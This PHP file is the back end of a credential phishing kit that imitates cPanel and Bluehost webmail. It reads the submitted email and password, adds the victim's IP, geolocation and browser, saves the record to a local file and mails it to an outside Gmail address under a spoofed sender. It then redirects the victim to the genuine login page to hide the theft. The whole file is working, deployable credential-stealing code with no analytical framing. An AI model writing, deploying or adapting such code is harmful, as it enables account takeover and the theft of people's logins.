<?php

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ Prof LOGS +=============\n";
$message .= "Email: ".$_POST['user']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "============= [ip] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";

$fp = fopen("use.txt","a");
fputs($fp,$message);
fputs($fp,"\n");
fclose($fp);


$domain = 'cPanel WebMail';
$subj = "cPanelWebmail Log ~ {$geoplugin->ip} ~ {$geoplugin->countryName}";
$from = "From: $domain<west>\n";
mail("3cees88@gmail.com",$subj,$message,$from,$domain);


header("Location: https://login.bluehost.com/box3007.bluehost.com/webmail");